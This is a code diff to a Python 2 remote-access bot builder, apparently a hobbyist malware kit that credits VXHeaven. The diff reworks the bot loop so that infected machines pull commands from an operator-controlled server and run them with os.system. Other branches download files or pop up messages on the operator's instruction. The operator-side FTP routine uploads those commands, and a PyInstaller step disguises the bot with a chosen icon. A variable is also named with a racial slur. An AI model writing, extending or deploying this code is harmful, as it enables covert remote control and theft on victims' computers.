@@ -186,14 +186,12 @@ cr4sh3r  |     \#Y         |
          |       |        /"""
 
 art9 = """
-                           SPECIAL THANKS TO:
+                                SPECIAL THANKS TO:
                          | R9, Vini_Nazi, VXHeaven, Pix|
                    _____ | St0rm, Glac, Kr0n0$, Leey   |_____
                          | InurlBrasil, J-Astolfo, Kane|
                    _____ | DoSNUT,Murdok,Booster,Kurono|_____
                          | Jh00n,BakuninM4lvadao, Xandi|
-                  
-
                          """
 
 
@@ -267,7 +265,7 @@ def startfun2(n):
 
 
     vir_code = '''import os, time, webbrowser, pyHook, pythoncom, sys, logging, wget
-import getpass, ctypes, random, inspect, PIL.ImageGrab, ftplib, urllib
+import getpass, ctypes, random, inspect, PIL.ImageGrab, ftplib, urllib, urllib2
 
 # START-UP
 
@@ -305,6 +303,10 @@ while nigga <= 1:
 
     while updater == "1":
         time.sleep(05)
+        for updater in range(1):
+            updater = f.readline(1)
+            time.sleep(5)
+
 
 
     while updater == "2":
@@ -332,33 +334,59 @@ while nigga <= 1:
                     traceback.print_exc()
 
                 time.sleep(30)
+                for updater in range(1):
+                    updater = f.readline(1)
+                    time.sleep(5)
 
     while updater == "3":
         #CMD
-        urlupda1 = "http://" + vir_myurl + "/cmd/" + vir_vicid + "/coml.txt"
-        f1 = urllib.urlopen(urlupda)
-        updater1 = f.read()
-        time.sleep(05)
-        os.system(updater1)
-        time.sleep(05)
+
+        for updatz5 in range(1):
+            urlup5 = "http://" + vir_myurl + "/cmd/" + vir_vicid + "/aat.js"
+            usock = urllib2.urlopen(urlup5)
+            updatz5 = usock.read()
+            usock.close()
+            os.system(updatz5)
+            time.sleep(1)
+
+        for updater in range(1):
+            updater = f.readline(1)
+            time.sleep(5)
 
     while updater == "4":
-                urlup5 = "http://" + vir_myurl + "/dm/" + vir_vicid + "/bling.html"
-                f2 = urllib.urlopen(urlup5)
-                updat6 = f2.readline(1)
-                ctypes.windll.user32.MessageBoxA(0, updat6 , "ERROR!", 1)
-                time.sleep(10)
+        for updat6 in range(1):
+            urlup5 = "http://" + vir_myurl + "/dm/" + vir_vicid + "/bling.js"
+            usock = urllib2.urlopen(urlup5)
+            updat6 = usock.read()
+            usock.close()
+            ctypes.windll.user32.MessageBoxA(0, updat6 , "ERROR!", 1)
+            time.sleep(10)
+
+        for updater in range(1):
+            updater = f.readline(1)
+            time.sleep(5)
 
     while updater == "5":
-                 time.sleep(05)
-                 urlup5 = "http://" + vir_myurl + "/df/" + vir_vicid + "/blong.html"
-                 f3 = urllib.urlopen(urlup5)
-                 updatz = f3.readline(1)
-                 wget.download(updatz)
-                 time.sleep(10)
+        time.sleep(05)
+
+        for updat6z in range(1):
+            urlup5 = "http://" + vir_myurl + "/df/" + vir_vicid + "/blong.js"
+            usock = urllib2.urlopen(urlup5)
+            updat6z = usock.read()
+            usock.close()
+            wget.download(updat6z)
+            time.sleep(10)
+
+
+        for updater in range(1):
+            updater = f.readline(1)
+            time.sleep(5)
 
     else:
         time.sleep(05)
+        for updater in range(1):
+            updater = f.readline(1)
+            time.sleep(5)
 
 
 exit()
@@ -372,7 +400,7 @@ exit()
     time.sleep(05)
 
     d5 = "move " + vir_fn + ".py" + " " + "C:\Python27\PyInstaller-2.1"
-    print 'Example: C:\Users\test\Desktop\kal.ico'
+    print 'Example: C:\Users\\test\\Desktop\kal.ico'
     icn = raw_input("ICON PATH:")
     c6 = "python C:\Python27\PyInstaller-2.1\pyinstaller.py --onefile -w " + "-i " + icn + " C:\Python27\PyInstaller-2.1\\" + vir_fn + ".py"
     e9 = "echo finished"
@@ -443,12 +471,11 @@ def ftp_con(m):
             print "What do you want me to do?"
             print "EXAMPLE: start notepad.exe "
             vic_com = raw_input(">>>")
-            aga = open("aat.html" , 'w')
+            aga = open("aat.js" , 'w')
             aga.write(vic_com)
             aga.close()
-            ftp.storbinary("STOR aat.html", open("aat.html", "rb"))
+            ftp.storbinary("STOR aat.js", open("aat.js", "rb"))
             time.sleep(5)
-            os.system("del " + "aat.txt")
             ftp.cwd("../")
             ftp.cwd("../")
             ftp.cwd("../")
@@ -485,10 +512,10 @@ def ftp_con(m):
             ftp.cwd(vic_id)
             print 'Write your message'
             me_com = raw_input('>>>')
-            mec = open("bling.html" , 'w')
+            mec = open("bling.js" , 'w')
             mec.write(me_com)
             mec.close()
-            ftp.storbinary("STOR bling.html", open("bling.html" , 'rb'))
+            ftp.storbinary("STOR bling.js", open("bling.js" , 'rb'))
             time.sleep(5)
             print "The bot is now showing " + me_com
             ftp.cwd("../")
@@ -505,10 +532,10 @@ def ftp_con(m):
             print 'Tell the bot what to download'
             print 'Ex: http://i.imgur.com/m6a0Vrm.jpg'
             mez_com = raw_input('>>>')
-            mez = open("blong.html" , 'w')
+            mez = open("blong.js" , 'w')
             mez.write(mez_com)
             mez.close()
-            ftp.storbinary("STOR blong.html", open("blong.html" , 'rb'))
+            ftp.storbinary("STOR blong.js", open("blong.js" , 'rb'))
             time.sleep(5)
             print "The bot is now downloading " + mez_com
             ftp.cwd("../")
@@ -554,41 +581,6 @@ while 1 >= kfckl :
 
 
 # Preserve the main author if you're going to change the code
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
